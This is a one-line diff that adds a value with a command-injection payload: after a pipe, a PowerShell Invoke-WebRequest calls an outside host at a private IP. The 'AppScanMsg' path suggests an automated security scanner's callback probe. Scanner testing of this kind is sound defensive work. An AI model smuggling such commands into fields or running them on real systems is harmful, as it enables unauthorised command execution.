@@ -1,0 +1,1 @@
+1234|powershell -command Invoke-WebRequest http://10.1.29.113:31205/AppScanMsg.html?varId=906
